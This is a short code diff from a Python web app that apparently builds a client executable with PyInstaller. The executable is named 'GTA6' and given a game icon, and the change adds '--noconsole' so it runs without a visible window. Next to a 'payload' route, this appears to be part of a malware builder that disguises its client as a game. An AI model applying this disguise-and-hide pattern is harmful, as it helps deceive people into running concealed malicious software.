@@ -87,7 +87,7 @@ def payload():
             return render_template('payload.html', string=payload_string)
 
 def pytoexe():
-    command = ['pyinstaller', '--name', 'GTA6', '--icon=./static/GTA6.ico', '--distpath=build/dist', 'Client.py']
+    command = ['pyinstaller', '--name', 'GTA6', '--icon=./static/GTA6.ico', '--distpath=build/dist', 'Client.py', '--noconsole']
     process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
     process.communicate()
     if process.returncode == 0:
